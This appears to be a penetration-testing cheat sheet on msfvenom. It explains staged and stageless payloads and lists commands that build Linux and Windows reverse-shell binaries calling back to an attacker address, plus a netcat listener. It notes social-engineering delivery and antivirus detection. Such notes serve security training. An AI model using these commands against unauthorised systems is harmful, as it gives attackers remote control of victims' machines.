## Payload Identification

**When to use** Identify available options and differentiate between delivery mechanisms when direct network access is unavailable.

List all available framework payloads

```
msfvenom -l payloads
```

### Staged vs Stageless Selection

**When to use** Network conditions or evasion requirements dictate payload delivery structure.

- **Staged Payloads**: Identified by `/` separators (e.g., `linux/x86/shell/reverse_tcp`).
- **Stageless Payloads**: Identified by `_` separators (e.g., `linux/zarch/meterpreter_reverse_tcp`).

**Tool comparison**

- **Staged Payloads**:
    - Sends a small "stage" first to download the rest of the shellcode.
    - Prefer when exploit memory space is limited.
- **Stageless Payloads**:
    - Sends the entire payload at once.
    - Prefer for **high latency** or **low bandwidth** environments to maintain stability.
    - Prefer for evasion to reduce network traffic during execution.

**Gotchas**

- **Staged payloads** may result in **unstable shell sessions** in high-latency environments.
- **Payload stages** consume memory, reducing space available for the primary payload.

---

## Linux Payload Generation

**When to use** Target is a Linux-based system and the engagement requires a standalone binary delivered via social engineering or alternative methods.

Build a stageless Linux ELF payload

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ATTACK_IP> LPORT=<PORT> -f elf > <FILE_PATH>.elf
```

Establish a listener to catch the reverse shell

```
sudo nc -lvnp <PORT>
```

---

## Windows Payload Generation

**When to use** Target is a Windows system and a standalone executable is required for execution.

Build a stageless Windows EXE payload

```
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACK_IP> LPORT=<PORT> -f exe > <FILE_PATH>.exe
```

> ⚠️ Gap: The source mentions using encoding and encryption to bypass anti-virus but does not provide the specific MSFvenom flags or syntax to implement them.

**Gotchas**

- **Raw payloads** created without encoding or encryption are **detected by Windows Defender**.
- **Missing translation capabilities** in stageless mainframe payloads require MSF to handle the session automatically.